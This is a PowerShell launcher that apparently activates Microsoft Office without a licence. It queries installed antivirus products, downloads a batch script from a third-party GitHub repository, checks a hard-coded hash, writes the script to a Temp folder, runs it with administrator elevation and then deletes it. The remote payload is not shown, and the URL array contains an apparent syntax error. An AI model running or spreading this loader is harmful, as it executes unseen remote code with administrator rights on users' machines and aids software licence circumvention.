if (-not $args) {
    Write-Host ''
}

& {
    $psv = (Get-Host).Version.Major

    if ($ExecutionContext.SessionState.LanguageMode.value__ -ne 0) {
        Write-Host "PowerShell is not running in Full Language Mode."
        return
    }

    try {
        [void][System.AppDomain]::CurrentDomain.GetAssemblies()
        [void][System.Math]::Sqrt(144)
    }
    catch {
        Write-Host "Powershell failed to load .NET command."
        return
    }

    function Check3rdAV {
        $cmd = if ($psv -ge 3) { 'Get-CimInstance' } else { 'Get-WmiObject' }
        & $cmd -Namespace root\SecurityCenter2 -Class AntiVirusProduct |
        Where-Object { $_.displayName -notlike '*windows*' } |
        Select-Object -ExpandProperty displayName | Out-Null
    }

    function CheckFile {
        param ([string]$FilePath)
        if (-not (Test-Path $FilePath)) {
            Check3rdAV
            Write-Host "Failed to create file, aborting!"
            throw
        }
    }

    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    } catch {}

    $URLs = @(
        'https://raw.githubusercontent.com/btrgvn/Active-Office/refs/heads/main/active.cmd',

    )

    Write-Progress -Activity "Downloading..." -Status "Please wait"
    $errors = @()

    foreach ($URL in $URLs | Sort-Object { Get-Random }) {
        try {
            if ($psv -ge 3) {
                $response = Invoke-RestMethod $URL
            } else {
                $w = New-Object Net.WebClient
                $response = $w.DownloadString($URL)
            }
            break
        }
        catch {
            $errors += $_
        }
    }

    Write-Progress -Activity "Downloading..." -Completed

    if (-not $response) {
        Write-Host "Failed to retrieve script."
        return
    }

    # Verify hash
    $releaseHash = 'C731BB797994B7185944E8B6075646EBDC2CEF87960B4B2F437306CB4CE28F03'

    $stream = New-Object IO.MemoryStream
    $writer = New-Object IO.StreamWriter $stream
    $writer.Write($response)
    $writer.Flush()
    $stream.Position = 0

    $hash = [BitConverter]::ToString(
        [Security.Cryptography.SHA256]::Create().ComputeHash($stream)
    ) -replace '-'

    if ($hash -ne $releaseHash) {
        Write-Warning "Hash mismatch, aborting!"
        return
    }

    # Check Autorun
    $paths = "HKCU:\SOFTWARE\Microsoft\Command Processor", "HKLM:\SOFTWARE\Microsoft\Command Processor"
    foreach ($path in $paths) { 
        if (Get-ItemProperty -Path $path -Name "Autorun" -ErrorAction SilentlyContinue) { 
            Write-Warning "Autorun registry found"
        } 
    }

    $rand = [Guid]::NewGuid().Guid
    $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')

    $FilePath = if ($isAdmin) {
        "$env:SystemRoot\Temp\MAS_$rand.cmd"
    } else {
        "$env:USERPROFILE\AppData\Local\Temp\MAS_$rand.cmd"
    }

    Set-Content -Path $FilePath -Value "@::: $rand `r`n$response"
    CheckFile $FilePath

    $env:ComSpec = "$env:SystemRoot\system32\cmd.exe"

    if ($psv -lt 3) {
        if (Test-Path "$env:SystemRoot\Sysnative") {
            Write-Warning "Run with x64 PowerShell"
            return
        }

        $p = Start-Process -FilePath $env:ComSpec `
            -ArgumentList "/c """"$FilePath"" -el -qedit $args""" `
            -Verb RunAs -PassThru

        $p.WaitForExit()
    }
    else {
        Start-Process -FilePath $env:ComSpec `
            -ArgumentList "/c """"$FilePath"" -el $args""" `
            -Wait -Verb RunAs
    }

    CheckFile $FilePath
    Remove-Item -Path $FilePath
} @args
